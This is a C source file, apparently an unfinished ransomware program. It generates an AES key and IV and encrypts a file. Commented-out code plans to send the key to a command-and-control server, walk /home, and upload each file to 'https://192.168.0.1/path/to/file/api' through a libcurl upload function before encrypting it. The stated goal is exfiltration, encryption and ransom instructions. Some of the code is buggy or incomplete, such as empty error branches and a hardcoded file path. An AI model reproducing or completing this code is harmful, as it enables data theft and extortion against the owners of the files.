#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "lib/aes.h"

#include "files.h"
#include "encryption.h"


void sendFileToApi(const char *path, const char *api);



int main(){
    //Generate AES key and IV
    srand((unsigned int)time(NULL));

    size_t key_length = 32;
    uint8_t key[key_length];
    generateRandomBytes(key, sizeof(key));

    size_t iv_length = 16;
    uint8_t iv[iv_length];
    generateRandomBytes(iv, sizeof(iv));

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    //Convert key and iv to string
    char key_string[key_length * 2 + 1], iv_string[iv_length];
    bytesToHexString(key, key_length, key_string);
    bytesToHexString(iv, iv_length, iv_string);
    printf("%s\n", key_string);
    printf("%s\n", iv_string);
    encryptFile(ctx, "a.txt");
    /*
    //Encrypt the AES key with the RSA public key

    //Send the encrypted AES key and iv to C2

    //List all the files we want to borrow ;)
    const char *path = "/home";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);
    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {
        //printf("%s\n", pathList.paths[i]); Debug
        //Send the raw file to C2
        sendFileToApi(pathList.paths[i], "https://192.168.0.1/path/to/file/api");

        //Encrypt each file with AES
        //encryptFile(ctx, "pathList.paths[i]");
    }
    freePathList(&pathList);


    //Redirect to C2's web page for instructions
    */
    return 0;
}
//WIP
void sendFileToApi(const char *path, const char *api){
    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
    CURL *curl;
    CURLcode res;
    struct stat file_info;
    curl_off_t speed_upload, total_time;
    FILE *fd;

    fd = fopen("debugit", "rb"); /* open file to upload */
    if(!fd)
        //Woops

    /* to get the file size */
    if(fstat(fileno(fd), &file_info) != 0)
        //Woops

    curl = curl_easy_init();
    if(curl){
        /* upload to this place */
        curl_easy_setopt(curl, CURLOPT_URL,
                         api);

        /* tell it to "upload" to the URL */
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        /* set where to read from (on Windows you need to use READFUNCTION too) */
        curl_easy_setopt(curl, CURLOPT_READDATA, fd);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            //Woops
        }

        curl_easy_cleanup(curl);
    }
    fclose(fd);

}




